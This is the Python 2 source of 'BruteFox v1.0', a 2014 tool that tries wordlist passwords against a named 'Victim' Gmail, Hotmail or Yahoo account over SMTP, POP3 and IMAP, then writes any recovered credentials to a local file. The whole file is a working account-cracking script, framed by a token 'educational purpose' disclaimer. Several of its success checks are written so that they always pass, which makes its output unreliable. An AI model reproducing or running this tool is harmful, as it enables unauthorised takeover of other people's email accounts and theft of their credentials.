#########################################################################################
#					BruteFox v1.0					#
#########################################################################################
#	Features:		Gmail, Hotmail and Yahoo Brute Forcer			#
#											#
#	Date:			20-August-2014						#
#											#
#	Disclaimer:		This program is only for educational purpose. 		#
#				Use it on your own risk					#
#											#
#	Public Version By: 	King Ali and Muhammad Adeel				#
#											#
#	Contact: 		www.facebook.com/master.king.ali.333  			#
#				Chaudhary1337@gmail.com					#
#											#
#	How to Use:		Python 2.7.5 or upgrade version should install 		#
#				into your system. Place passlist.txt into same 		#
#				directory						#
#											#
#########################################################################################

#!/usr/bin/python
# -*- coding: utf-8 -*-

try:
	import poplib, imaplib, smtplib, time, sys 
	from imaplib import IMAP4
	from poplib import POP3
except ImportError:
	exit("You Might be using Old version of Python. Please upgrade it First...!")

def wellcome_banner():
	print '========================================================================='
	print '|||||			 BruteFox v1.0			    	    |||||'
	print '========================================================================='
	print '|									|'
	print '| 	Author:		Ali Ahmer 	AKA 	King Ali	   	|'
	print '|			Muhammad Adeel	AKA	Stoker			|'
	print '|									|'
	print '| 	Release Date:	20-August-2014					|'
	print '|									|'
	print '| 	Contact:	www.facebook.com/master.king.ali.333		|'
	print '|			Chaudhary1337@gmail.com				|'	
	print '|	 								|'
	print '| 	Disclaimer:	This tool is only for education purpose. 	|'
	print '|			Use it at your own risk.		        |'
	print '|									|'
	print '========================================================================='+'\n\r\n\r'

def g_banner():
	print """=================================================================================
|||||				Gmail BruteForcer			    |||||
=================================================================================\n\r"""

def h_banner():
	print"""=================================================================================
|||||				Hotmail BruteForcer			    |||||
=================================================================================\n\r"""
	print 'Note: It will work only if hotmail account has POP3 Enable...!\n\r'

def y_banner():
	print """=================================================================================
|||||				Yahoo BruteForcer			    |||||
=================================================================================
\n\r"""

def sorry():
	print "Sorry, No correct password have been found....!\n\r"
def exit():
	print '\n\r'+'This is public version. For privat version Contact Us...!\n\r'
	time.sleep(2)
	print './logout'
	sys.exit(1)
def gmail():
	user = raw_input("[+] Victim Gmail: ")
	passlist= raw_input("[+] Password List [pass.txt]: ")
	fn = open (passlist, "r")
	counting = fn.readlines()
	print "[+] Worldlist Length: %s " % len(counting)
	smtp_host = 'smtp.gmail.com'
	smtp_port = 465
	session = smtplib.SMTP_SSL()
	session.connect(smtp_host, smtp_port)
	#session.ehlo()
	#session.starttls()
	session.ehlo
	print "Start cracking using gmail server.....\n\r"
	time.sleep(2)
	fn = open (passlist, 'r')
	for pass_file in fn:
		try:
			print "[+] Trying: {0}".format(pass_file)+"\n\r"
			y_g= session.login(user, pass_file[:-1])
			if (y_g == (235, '2.7.0 Accepted')):
				print "> Correct Password have been found....!\n\r"
				time.sleep(2)
				print "Email: {0}".format(user)+"\n\r"
				print "Password is: {0}".format(pass_file)+"\n\r\n\r\n\r"
				session.quit()
				fn.close()
				fw = open('Gmail.txt','w')
				fw.write(user+': '+pass_file)
				fw.close()
				print "Email and Password saved in Gmail.txt file.\n\r"
				exit()
		except smtplib.SMTPAuthenticationError:
			continue
def hotmail():
	user = raw_input("[+] Victim Hotmail: ")
	passlist= raw_input("[+] Password List [pass.txt]: ")
	fn = open (passlist, "r")
	counting = fn.readlines()
	print "[+] Worldlist Length: %s " % len(counting)
	host = 'pop3.live.com'
	port = 995
	server = poplib.POP3_SSL(host, port)
	print "Start cracking using hotmail server.....\n\r"
	time.sleep(2)
	fn = open (passlist, 'r')
	for pass_file in fn:
		print "[+] Trying: {0}".format(pass_file)+"\n\r"
		pwd = pass_file[:-1]
		try:
			x = server.user(user)
			yy = server.pass_(pwd)
			if(yy == '+OK' or 'POP disabled'):
				print "> Correct Password have been found....!\n\r"
				time.sleep(2)
				print "Email: {0}".format(user)+"\n\r"
				print "Password is: {0}".format(pwd)+"\n\r\n\r\n\r"
				server.quit()
				fn.close()
				fw = open('Hotmail.txt','w')
				fw.write(user+': '+pwd)
				fw.close()
				print "Email and Password saved in Hotmail.txt file.\n\r"
				exit()
		except poplib.error_proto:
			continue
def yahoo():
	user = raw_input("[+] Victim Yahoomail: ")
	passlist= raw_input("[+] Password List [pass.txt]: ")
	fn = open (passlist, "r")
	counting = fn.readlines()
	print "[+] Worldlist Length: %s " % len(counting)
	host = 'imap.mail.yahoo.com'
	port = 993
	print "Start cracking using Yahoo server.....\n\r"
	time.sleep(2)
	fn = open (passlist, 'r')
	for pass_file in fn:
		try:
			session = imaplib.IMAP4_SSL(host, port)
			print "[+] Trying: {0}".format(pass_file)+"\n\r"
			y = session.login(user, pass_file[:-1])
			if (y == 'OK' or 'AUTHENTICATE completed'):
				print "> Correct Password have been found....!\n\r"
				time.sleep(2)
				print "Email: {0}".format(user)+"\n\r"
				print "Password is: {0}".format(pass_file)+"\n\r\n\r\n\r"
				session.logout()
				fn.close()
				fw = open('Yahoomail.txt','w')
				fw.write(user+': '+pass_file)
				fw.close()
				print "Email and Password saved in Yahoomail.txt file.\n\r"
				exit()
		except IMAP4.error:
			continue

################################################################################################

wellcome_banner()
while(1):
	print '''	        1.	Gmail Bruter
				
		2.	Hotmail Bruter
				
		3.	Yahoomail Bruter
				
		4.	Exit \n\r'''
	choice=raw_input('[+] Enter Choice: ')
	if choice == '1':
		g_banner()
		time.sleep(1)
		gmail()
		sorry()
		time.sleep(1)
	elif choice == '2':
		h_banner()
		time.sleep(1)
		hotmail()
		sorry()
		time.sleep(1)
	elif choice == '3':
		y_banner()
		time.sleep(1)
		yahoo()
		sorry()
		time.sleep(1)
	elif choice == '4':
		exit()
	else:
		print 'Wronge input. Try Again...!\n\r'

